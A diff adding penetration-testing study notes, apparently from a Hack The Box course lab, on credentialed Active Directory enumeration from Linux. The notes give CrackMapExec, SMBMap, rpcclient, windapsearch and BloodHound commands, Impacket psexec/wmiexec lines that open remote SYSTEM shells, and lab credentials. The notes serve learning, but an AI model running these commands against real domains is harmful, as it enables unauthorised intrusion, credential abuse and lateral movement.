@@ -871,3 +871,249 @@ RealTimeProtectionEnabled parameter is set to True, which means Defender is enab
 ## Importance
 - **Understand Protections**: Knowing the security controls helps avoid or modify tools and plan actions effectively.
 - **Target Specific Users**: Identify AD users who can read LAPS passwords for targeted actions.
+
+# Credentialed Enumeration From Linux 
+
+Credentialed enumeration involves leveraging valid domain user credentials to gather detailed information about domain users, groups, permissions, and shares. Below are step-by-step notes and commands for conducting such enumeration.
+
+---
+
+#### **1. Setting Up**
+- **Credentials**: User `forend` with password `Klmcargo2`.
+- **Domain Controller (DC)**: Address is `172.16.5.5`.
+- Commands should be prefaced with `sudo` when necessary.
+- **Linux Host**: Use tools installed on `ATTACK01` Parrot Linux.
+
+---
+
+### **Using CrackMapExec (CME)**
+
+#### **Basic Syntax for CME**
+```bash
+crackmapexec smb [target] -u [username] -p [password] [options]
+```
+
+#### **Enumerate Domain Users**
+```bash
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+```
+- **Output**: Lists domain users with attributes like `badPwdCount`, useful for identifying locked accounts or accounts with repeated failed login attempts.
+
+#### **Enumerate Domain Groups**
+```bash
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+```
+- **Output**: Lists groups, their member counts, and identifies groups of interest like `Domain Admins` or `Backup Operators`.
+
+#### **Enumerate Logged-On Users**
+```bash
+sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+```
+- **Output**: Shows currently logged-on users, useful for identifying administrative accounts or potential targets.
+
+#### **Enumerate SMB Shares**
+```bash
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+```
+- **Output**: Displays available shares on the target, including their permissions (`READ` or `WRITE`).
+
+#### **Spidering Shares for Files**
+```bash
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+```
+- **Output**: Crawls through a specific share (e.g., `Department Shares`) and saves results in JSON format at `/tmp/cme_spider_plus/<ip of host>.json`.
+
+---
+
+### **Using SMBMap**
+
+#### **Basic Syntax for SMBMap**
+```bash
+smbmap -u [username] -p [password] -d [domain] -H [target IP] [options]
+```
+
+#### **Check Share Access**
+```bash
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+```
+- **Output**: Lists shares and access permissions.
+
+#### **Recursively List Directories in a Share**
+```bash
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+```
+- **Output**: Lists all subdirectories in the `Department Shares`.
+
+---
+
+
+### **Using rpcclient**
+`rpcclient` leverages the Samba protocol for various Active Directory (AD) tasks, including user and group enumeration.
+
+#### **Basic Connection**
+```bash
+rpcclient -U "" -N 172.16.5.5
+```
+- **-U ""**: Unauthenticated SMB NULL session.
+- **-N**: No password.
+
+#### **Enumerate Domain Users**
+```bash
+rpcclient $> enumdomusers
+```
+- **Output**: Displays domain users and their RIDs (Relative Identifiers).
+
+#### **Query User by RID**
+```bash
+rpcclient $> queryuser [RID]
+```
+- Example for `htb-student` RID (0x457):
+  ```bash
+  rpcclient $> queryuser 0x457
+  ```
+
+#### **Explanation of SID and RID**
+- Domain SID: `S-1-5-21-<unique domain identifier>`.
+- User SID: Combines Domain SID with RID (e.g., `S-1-5-21-<unique domain ID>-1111`).
+
+---
+
+### **Using Impacket Toolkit**
+
+#### **psexec.py**
+-  Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.
+- **Usage**:
+  ```bash
+  psexec.py [domain/user]:[password]@[target]
+  ```
+- Example:
+  ```bash
+  psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
+  ```
+- **Output**: Shell prompt with SYSTEM privileges on the target.
+
+#### **wmiexec.py**
+- Executes commands via Windows Management Instrumentation (WMI).
+- **Usage**:
+  ```bash
+  wmiexec.py [domain/user]:[password]@[target]
+  ```
+- Example:
+  ```bash
+  wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
+  ```
+ this shell environment is not fully interactive, so each command issued will execute a new cmd.exe from WMI and execute your command. The downside of this is that if a vigilant defender checks event logs and looks at event ID 4688: A new process has been created, they will see a new process created to spawn cmd.exe and issue a command.
+---
+
+### **Using Windapsearch**
+`windapsearch.py` performs LDAP queries to enumerate AD information.
+
+#### **Help Menu**
+```bash
+python3 /opt/windapsearch/windapsearch.py -h
+```
+
+#### **Enumerate Domain Admins**
+```bash
+python3 /opt/windapsearch/windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+```
+- **Output**: Lists members of the `Domain Admins` group.
+
+#### **Enumerate Privileged Users**
+```bash
+python3 /opt/windapsearch/windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+```
+- **Output**: Identifies privileged users, including those with nested group membership.
+
+---
+
+### **Tips for Effective Enumeration**
+- **Save Outputs**: Redirect results to files for better analysis.
+- **Combine Tools**: Use results from `rpcclient` with `windapsearch` or Impacket tools to correlate data.
+- **Focus on Privileged Accounts**: Pay special attention to `Domain Admins`, nested group memberships, and service accounts.
+
+## Bloodhound
+
+**Introduction to BloodHound**
+- **Purpose**: BloodHound is a powerful tool for auditing Active Directory security by creating graphical representations of access paths.
+- **Components**: 
+  - SharpHound collector (C# for Windows)
+  - BloodHound.py collector (Python for Linux)
+  - BloodHound GUI for data visualization and query execution
+
+### Setting Up BloodHound.py
+**Prerequisites**: Requires Impacket, ldap3, and dnspython.
+
+### Running BloodHound.py
+```bash
+bloodhound-python -h
+
+# Output shows various options:
+# -h, --help            show this help message and exit
+# -c COLLECTIONMETHOD, --collectionmethod COLLECTIONMETHOD
+# -u USERNAME, --username USERNAME
+# -p PASSWORD, --password PASSWORD
+```
+- **Collection Methods**:
+  - Group, LocalAdmin, Session, Trusts, Default (all previous), DCOnly (no computer connections), DCOM, RDP, PSRemote, LoggedOn, ObjectProps, ACL, All (all except LoggedOn)
+
+### Executing BloodHound.py with Domain Credentials
+```bash
+sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
+
+# Example output:
+# INFO: Found AD domain: inlanefreight.local
+# INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+# INFO: Found 1 domains
+# INFO: Found 2 domains in the forest
+# INFO: Found 564 computers
+# INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+# INFO: Found 2951 users
+# INFO: Found 183 groups
+# INFO: Found 2 trusts
+# INFO: Starting computer enumeration with 10 workers
+```
+- **Explanation**: This command runs all checks using the specified domain credentials and domain controller.
+
+### Viewing the Results
+```bash
+ls
+
+# Output will show:
+# 20220307163102_computers.json  
+# 20220307163102_domains.json  
+# 20220307163102_groups.json  
+# 20220307163102_users.json
+```
+- **Explanation**: The output files are JSON files containing the collected data.
+
+### Uploading Data to BloodHound GUI
+1. **Start the Neo4j service**:
+   ```bash
+   sudo neo4j start
+   ```
+2. **Start BloodHound GUI**:
+   ```bash
+   bloodhound
+   ```
+   - **Credentials**: 
+     - User: `neo4j`
+     - Password: `HTB_@cademy_stdnt!`
+
+3. **Upload Data**:
+   ```bash
+   zip -r ilfreight_bh.zip *.json
+   ```
+   - **Upload the Zip file** using the "Upload Data" button in the BloodHound GUI.
+
+### Running Queries in BloodHound
+- **Built-in Queries**: Use the Analysis tab to run pre-built queries.
+- **Custom Cypher Queries**: Use custom Cypher queries for specific analysis.
+
+### Example Query: Finding Shortest Paths to Domain Admins
+- **Path Finding Queries**: Useful for identifying paths to escalate privileges to Domain Administrator.
+
+**Exploring BloodHound GUI Features**:
+- **Database Info Tab**: View detailed information about the database.
+- **Node Info Tab**: Search for specific nodes like Domain Users.
+- **Settings Menu**: Adjust how nodes and edges are displayed, enable query debug mode, and enable dark mode.
